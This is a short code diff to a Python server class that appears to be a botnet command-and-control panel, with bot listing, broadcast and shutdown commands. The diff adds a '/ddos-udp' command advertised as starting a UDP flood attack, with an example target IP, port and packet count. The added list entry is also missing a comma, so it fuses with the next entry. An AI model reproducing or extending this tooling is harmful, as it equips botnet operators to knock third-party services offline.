@@ -86,7 +86,7 @@ class Server:
             print(" ")
 
             self.log("info", f"New connection <{client_address}>:S85")
-            self.log("debug", f"Socket - (({client_socket})):S86")
+            #self.log("debug", f"Socket - (({client_socket})):S86")
 
             #print(".(Type Enter to countinue)")
 
@@ -118,11 +118,12 @@ class Server:
 
 
     def source(self, cmd):
-        cmdList = ["/msg - Broadcast",
-                   "@bot - Bot list",
-                   "$panic - to server down",
-                   "$log - show last n loggs",
-                   "$lds - Call Lds"
+        cmdList = ["/msg : Broadcast",
+                   "/ddos-udp : Start a udp flood attack [ usage > /ddos-udp 127.0.0.1 53 -c 128000 ]"
+                   "@bot : Bot list",
+                   "$panic : to server down",
+                   "$log : show last n loggs",
+                   "$lds : Call Lds"
                    ]
 
         if cmd:
